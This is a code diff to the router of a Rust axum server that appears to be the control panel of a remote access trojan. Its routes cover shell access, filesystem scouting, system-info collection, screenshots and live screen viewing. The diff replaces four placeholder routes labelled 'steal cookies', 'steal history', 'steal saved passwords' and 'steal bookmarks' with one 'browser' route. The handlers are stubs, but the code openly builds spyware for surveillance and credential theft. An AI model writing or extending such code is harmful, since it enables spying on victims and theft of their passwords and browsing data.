@@ -3,7 +3,7 @@ mod fetch;
 mod fsxp;
 mod scrn;
 
-use crate::{extensions::Password, ShellState};
+use crate::extensions::{Password, ShellState};
 use axum::{
     routing::{get, post},
     Extension, Router,
@@ -19,10 +19,7 @@ pub fn all_routes(shellstate: Arc<Mutex<ShellState>>, password: Arc<Mutex<Passwo
         .route("/fsxp", post(fsxp::scout_path))
         // routes for easier access
         .route("/fetch", post(fetch::fetch_sys_info))
-        .route("/cookies", post("steal cookies"))
-        .route("/history", post("steal history"))
-        .route("/autofill", post("steal saved passwords"))
-        .route("/bookmarks", post("steal bookmarks"))
+        .route("/browser", post("browser route"))
         // routes for real time data
         .route("/skrin/snap", post(scrn::screenshot))
         .route("/skrin", post("real time screen"))
